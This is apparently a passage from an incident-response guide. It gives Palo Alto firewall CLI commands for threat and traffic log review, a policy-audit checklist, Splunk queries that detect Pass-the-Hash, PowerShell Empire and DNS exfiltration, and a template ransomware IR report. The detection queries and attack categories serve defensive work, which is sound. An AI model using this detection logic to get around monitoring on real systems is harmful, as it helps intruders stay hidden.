> show log threat threatid equal 91820  # Example: Log4Shell CVE-2021-44228

# --- CLI: IPS events from external sources ---
> show log threat type equal vulnerability direction equal backward src-zone equal untrust

# --- CLI: Check for specific attack types ---
> show log threat type equal vulnerability category equal code-execution
> show log threat type equal vulnerability category equal overflow
> show log threat type equal vulnerability category equal sql-injection
> show log threat type equal vulnerability category equal command-injection

# ===== IPS SIGNATURE INVESTIGATION =====
#
# For each triggered signature:
# 1. Note the Threat ID
# 2. Look up details: https://threatvault.paloaltonetworks.com
# 3. Determine if the target was vulnerable
# 4. Check if the action was block, alert, or reset
# 5. Correlate with endpoint logs on the target
# 6. Verify the signature is not a false positive

# --- CLI: Check threat prevention profile configuration ---
> show running security-policy | match threat
> show running threat-prevention

# --- CLI: View specific threat signature details ---
> show threat id <threat-id>

# ===== KEY IPS EVENT IDS TO MONITOR =====
#
# CVE-based signatures:
# - Check for exploitation of known CVEs against your systems
# - Cross-reference with your vulnerability scan results
# - Verify patching status of targeted systems
#
# Generic signatures:
# - SQL injection patterns
# - Command injection attempts
# - Directory traversal attacks
# - Buffer overflow attempts
# - Cross-site scripting (XSS)
```

---

### 9. Denied Access: Blocked IP Investigation

```text [pa-blocked-analysis.txt]
# ===== BLOCKED IP AND URL ANALYSIS =====

# --- CLI: View all denied traffic ---
> show log traffic action equal deny direction equal backward last-n-logs 500

# --- CLI: Denied traffic from external sources ---
> show log traffic action equal deny src-zone equal untrust direction equal backward

# --- CLI: Denied traffic from internal sources (infected host trying to reach C2) ---
> show log traffic action equal deny src-zone equal trust direction equal backward

# --- CLI: Check specific blocked IP ---
> show log traffic dst equal 203.0.113.50 action equal deny

# --- CLI: Check External Dynamic Lists (EDL) hits ---
> show log threat category equal any action equal block-url direction equal backward

# --- CLI: View currently loaded EDLs ---
> show running external-dynamic-list

# --- CLI: Check specific EDL content ---
> request system external-list show type ip name "Malicious-IPs-EDL"

# --- CLI: Refresh EDL ---
> request system external-list refresh type ip name "Malicious-IPs-EDL"

# ===== BLOCKED TRAFFIC INVESTIGATION STEPS =====
#
# 1. Identify the most frequently blocked destinations:
#    - Are they known malicious IPs/domains?
#    - Check against threat intelligence feeds
#    - Look up on VirusTotal, AbuseIPDB, OTX
#
# 2. Identify internal hosts attempting to reach blocked destinations:
#    - These may be compromised endpoints
#    - Cross-reference with EDR alerts
#    - Check if connections started before or after blocking
#
# 3. Analyze blocked traffic patterns:
#    - Regular intervals = beaconing (C2)
#    - Large data volumes = attempted exfiltration
#    - Multiple destinations = scanning/spreading
#
# 4. Verify blocking is effective:
#    - Check that deny rules are properly placed
#    - Ensure encrypted traffic is being inspected
#    - Verify EDLs are updating properly

# --- Threat Intelligence Lookup ---
# VirusTotal: https://www.virustotal.com/gui/ip-address/<IP>
# AbuseIPDB: https://www.abuseipdb.com/check/<IP>
# OTX: https://otx.alienvault.com/indicator/ip/<IP>
# Shodan: https://www.shodan.io/host/<IP>
```

---

### 10. Policy Audit: Security Rule Review

```text [pa-policy-review.txt]
# ===== SECURITY POLICY CONFIGURATION REVIEW =====

# --- CLI: View all security policies ---
> show running security-policy

# --- CLI: Show security policy hit count ---
> show rule-hit-count vsys vsys1 security

# Example output:
# Rule Name                  Hit Count    Last Hit
# Allow-DNS                  1234567      2024/01/15 10:30:00
# Allow-Web                  8901234      2024/01/15 10:29:55
# Block-Malicious            56789        2024/01/15 10:28:30
# Temp-Allow-All             999999       2024/01/15 10:30:01  <-- SUSPICIOUS!

# --- CLI: Find overly permissive rules ---
# Look for rules with:
# - "any" in source, destination, application, or service
# - "allow" action without security profiles
# - No logging enabled

> show running security-policy | match "any"

# --- CLI: Check for rules without security profiles ---
> show running security-policy | match "profile"

# --- CLI: Check NAT policies ---
> show running nat-policy

# --- CLI: Check for disabled security profiles ---
> show running threat-prevention
> show running url-filtering
> show running file-blocking
> show running wildfire-analysis

# ===== SECURITY POLICY AUDIT CHECKLIST =====
#
# □ No "allow any" rules without specific justification
# □ All allow rules have threat prevention profiles
# □ All allow rules have URL filtering profiles
# □ All allow rules have file blocking profiles
# □ All allow rules have WildFire analysis profiles
# □ SSL decryption is enabled for relevant traffic
# □ Default deny rule exists at bottom of rule base
# □ Zone-based segmentation is properly configured
# □ No temporary rules older than 30 days
# □ All rules have descriptions and ticket references
# □ Logging is enabled on all rules (log-start and log-end)
# □ Security profiles are set to appropriate actions (block vs alert)
#
# Red Flags:
# - Rules with "any" application/service and "allow" action
# - Rules with no security profiles attached
# - Rules with logging disabled
# - Rules modified around the time of the incident
# - Temporary rules that were never removed
# - Rules allowing traffic from untrust to trust on non-standard ports

# --- CLI: Check recent configuration changes ---
> show config audit info

# --- CLI: View configuration change log ---
> show log config direction equal backward last-n-logs 100

# --- CLI: Compare running config with candidate ---
> show config diff

# --- CLI: Check administrator activity ---
> show log system subtype equal auth direction equal backward
> show admins all
```

---

## Cross-Platform IR Tools

### SIEM Investigation: Centralized Log Analysis

::card-group
  ::card
  ---
  title: Splunk Queries for IR
  icon: i-lucide-search
  ---
  ```text
  # Detect lateral movement (Pass-the-Hash)
  index=windows EventCode=4624 LogonType=3 
  | stats count by src_ip, dest, user 
  | where count > 5

  # Detect PowerShell Empire
  index=windows EventCode=4104 
  ScriptBlockText="*System.Management.Automation*" 
  | table _time, ComputerName, ScriptBlockText

  # Detect data exfiltration via DNS
  index=dns query_length>50 
  | stats count by src_ip, query 
  | where count > 100
  ```
  ::

  ::card
  ---
  title: EDR Investigation
  icon: i-lucide-shield-check
  ---
  ```text
  Key EDR queries during IR:
  ├── Process trees for suspicious executions
  ├── File creation/modification timeline
  ├── Network connections by process
  ├── Registry modifications
  ├── Loaded DLLs per process
  ├── Script execution logs
  └── Behavioral detection alerts

  Popular EDR tools:
  ├── CrowdStrike Falcon
  ├── Microsoft Defender for Endpoint
  ├── SentinelOne
  ├── Carbon Black
  └── Velociraptor (open source)
  ```
  ::
::

---

## IR Report: Executive Summary Template

```text [IR-Report-Template.txt]
═══════════════════════════════════════════════════
        INCIDENT RESPONSE REPORT
        CONFIDENTIAL - RESTRICTED
═══════════════════════════════════════════════════

EXECUTIVE SUMMARY
══════════════════
Incident ID:        IR-2024-0042
Classification:     P1 - Critical
Type:               Ransomware with Data Exfiltration
Status:             CLOSED
Report Date:        2024-01-25
Report Author:      [IR Lead Name]

IMPACT SUMMARY
══════════════
Duration:           72 hours (detection to recovery)
Dwell Time:         14 days (initial compromise to detection)
Systems Affected:   12 servers, 45 workstations
Data Affected:      Customer PII (est. 50,000 records)
Financial Impact:   $2.3M (response, recovery, notification)
Operational Impact: 26 hours production downtime

TIMELINE SUMMARY
════════════════
2024-01-01  Initial compromise via spear-phishing email
2024-01-01  Attacker established persistence (scheduled task)
2024-01-03  Lateral movement to file server via Pass-the-Hash
2024-01-08  Data staging on compromised server
2024-01-10  Data exfiltration to external C2 server
2024-01-15  SIEM alert triggered by anomalous data transfer
2024-01-15  IR team activated, containment initiated
2024-01-16  Full containment achieved
2024-01-17  Eradication completed
2024-01-18  Recovery and validation completed
2024-01-25  Post-incident review completed

ROOT CAUSE
══════════
Initial vector: Spear-phishing email with macro-enabled document
Exploitation: CVE-2024-XXXX (unpatched MS Office vulnerability)
Persistence: Scheduled task + WMI event subscription
Lateral Movement: Pass-the-Hash using cached admin credentials
Exfiltration: HTTPS to attacker-controlled domain via port 443

REMEDIATION ACTIONS TAKEN
═════════════════════════
✓ All compromised systems rebuilt from clean images
✓ All domain credentials reset (including KRBTGT x2)
✓ Attacker C2 infrastructure blocked at all egress points
✓ CVE-2024-XXXX patched across all systems
✓ Network segmentation implemented
✓ Enhanced monitoring deployed on all affected segments
✓ EDR deployed to all endpoints
✓ MFA enabled for all remote access

RECOMMENDATIONS
═══════════════
1. [IMMEDIATE] Deploy email sandboxing for attachments
2. [30 DAYS] Implement LAPS for local admin passwords
3. [60 DAYS] Deploy microsegmentation for critical servers
4. [90 DAYS] Implement privileged access workstations (PAWs)
5. [ONGOING] Monthly phishing simulations for all staff
6. [ONGOING] Quarterly IR tabletop exercises

REGULATORY NOTIFICATIONS
════════════════════════
☐ GDPR: Supervisory Authority (72-hour deadline met)
☐ Affected individuals notified
☐ State Attorney General offices (per state requirements)
☐ Cyber insurance carrier notified

APPENDICES
══════════
A. Detailed Technical Timeline
B. IOC List (IPs, Domains, Hashes, YARA Rules)
C. Evidence Inventory and Chain of Custody
D. Network Diagrams (Pre/Post Incident)
E. Communication Log
F. Cost Breakdown
```

---

::caution
**Classification Reminder:** All incident response documentation should be classified as **CONFIDENTIAL** and distributed only on a need-to-know basis. Improper disclosure of IR reports can expose vulnerabilities, compromise legal proceedings, and violate regulatory obligations.
::

::tip
**Continuous Improvement:** This framework is a living document. After each incident, update procedures, add new IOCs to detection rules, refine playbooks, and conduct training on lessons learned. The best IR teams are those that never stop improving.
::